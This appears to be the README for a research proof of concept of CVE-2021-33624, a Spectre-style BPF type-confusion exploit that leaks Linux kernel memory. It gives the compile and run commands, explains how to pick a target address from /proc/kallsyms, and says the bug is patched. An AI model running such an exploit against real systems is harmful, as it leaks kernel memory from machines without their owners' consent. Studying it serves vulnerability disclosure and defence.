# Proof of Concept for CVE-2021-33624

compile with

`gcc -pthread -o bpf_spectre_type_confusion bpf_spectre_type_confusion.c -Wall -ggdb -std=gnu99`

execute with 

`(sudo) ./bpf_spectre_type_confusion 1 2 ffffffffa4925620 0x10`

where `1` and `2` are CPU threads which run on two distinct hardware cores, `ffffffffa4925620` is the target memory we want to leak and `0x10` is the number of bytes to be leaked. The exploit is fixed but it is still possible to observe the results by executing the code as sudo, since the countermeasures are only applied in the non-sudo case. 

The example address for the leak can be obtained from `sudo cat /proc/kallsyms | grep core_pattern` and the expected result seen with `cat /proc/sys/kernel/core_pattern`

Using DIV instructions (internally patched to include a branch, to avoid division by zero exceptions) to misstrain the branch predictor was discovered by Piotr during his research. Reference https://www.openwall.com/lists/oss-security/2021/06/21/1 

Special Thanks to Jann Horn, who has developed the fundament of this exploit code in his initial research (https://bugs.chromium.org/p/project-zero/issues/detail?id=1711)
